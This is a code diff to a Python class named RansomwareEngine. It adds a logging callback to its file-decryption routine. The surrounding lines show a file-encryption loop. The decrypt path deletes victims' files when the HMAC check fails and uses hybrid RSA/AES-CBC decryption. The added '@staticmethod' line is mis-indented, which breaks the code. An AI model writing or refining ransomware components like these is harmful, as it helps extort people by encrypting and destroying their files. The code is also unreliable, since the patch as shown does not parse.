@@ -209,9 +209,15 @@ class RansomwareEngine:
                     time.sleep(0.05)  # small delay
         return {"status": "success", "files_encrypted": total_encrypted, "details": results}
 
-    @staticmethod
-    def safe_decrypt_file(encrypted_path, private_key_pem, hmac_key):
+        @staticmethod
+    def safe_decrypt_file(encrypted_path, private_key_pem, hmac_key, log_callback=None):
         """Decrypt a file; if HMAC fails, the file is deleted."""
+        def log(msg):
+            if log_callback:
+                log_callback(msg)
+            else:
+                print(msg)
+        
         try:
             with open(encrypted_path, 'rb') as f:
                 data = f.read()
@@ -228,14 +234,16 @@ class RansomwareEngine:
             h.update(encrypted_aes_key + ciphertext)
             try:
                 h.verify(signature)
+                log(f"HMAC verification OK for {encrypted_path}")
             except ValueError:
-                print(f"[DECRYPT] HMAC verification failed for {encrypted_path} – file will be deleted")
+                log(f"❌ HMAC verification FAILED for {encrypted_path} – deleting file")
                 if os.path.exists(encrypted_path):
                     os.remove(encrypted_path)
                 raise Exception("Integrity check failed – file deleted.")
 
             rsa_cipher = PKCS1_OAEP.new(RSA.import_key(private_key_pem))
             file_aes_key = rsa_cipher.decrypt(encrypted_aes_key)
+            log(f"RSA decryption of AES key OK for {encrypted_path}")
 
             cipher = AES.new(file_aes_key, AES.MODE_CBC, iv)
             plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
@@ -245,8 +253,8 @@ class RansomwareEngine:
                 f.write(plaintext)
 
             os.remove(encrypted_path)
-            print(f"[DECRYPT] Success: {original_path}")
+            log(f"✅ Decrypted and removed {encrypted_path}")
             return True
         except Exception as e:
-            print(f"[DECRYPT] Error decrypting {encrypted_path}: {e}")
+            log(f"❌ Error decrypting {encrypted_path}: {e}")
             raise e
